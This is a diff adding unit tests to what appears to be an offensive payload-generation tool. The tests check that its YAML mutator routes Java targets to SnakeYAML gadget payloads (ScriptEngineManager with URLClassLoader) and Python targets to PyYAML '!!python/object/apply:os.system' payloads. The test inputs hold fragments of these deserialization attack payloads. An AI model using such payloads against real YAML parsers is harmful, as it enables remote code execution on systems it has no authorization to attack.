@@ -135,5 +135,31 @@ class TestJavaChainMapAndExceptionHandling(unittest.TestCase):
         self.assertEqual(pm._resolve_chains(), ["ROME"])
 
 
+class TestYamlMutationRespectsJavaVsPython(unittest.TestCase):
+    """Regression: _mutate_yaml() phai doc self.etype de phan biet SnakeYAML
+    (Java) voi PyYAML (Python) - truoc fix, ca 2 deu nhan chung 1 payload
+    Python ("!!python/object/apply:os.system"), vo dung voi target Java that
+    (SnakeYAML khong hieu cu phap Python)."""
+
+    def test_java_exploit_type_gets_snakeyaml_payload_not_python(self):
+        results = mutate("!!javax.script.ScriptEngineManager [...]", "yaml_exec", "YAML Java ScriptEngine")
+        self.assertEqual(len(results), 1)
+        payload = decoded_payloads(results)[0]
+        self.assertIn("javax.script.ScriptEngineManager", payload)
+        self.assertIn("java.net.URLClassLoader", payload)
+        self.assertNotIn("!!python/", payload, "Khong duoc gui cu phap Python cho target Java")
+
+    def test_python_exploit_type_still_gets_python_payload(self):
+        results = mutate("!!python/object/apply:os.system ['id']", "yaml_exec", "YAML Python RCE")
+        self.assertEqual(len(results), 3)  # 1 cho moi TEST_COMMANDS
+        for payload in decoded_payloads(results):
+            self.assertIn("!!python/object/apply:os.system", payload)
+
+    def test_java_class_injection_subtype_also_routes_to_java_payload(self):
+        results = mutate("!!java.lang.Runtime [...]", "yaml_exec", "YAML Java Class")
+        payload = decoded_payloads(results)[0]
+        self.assertIn("javax.script.ScriptEngineManager", payload)
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
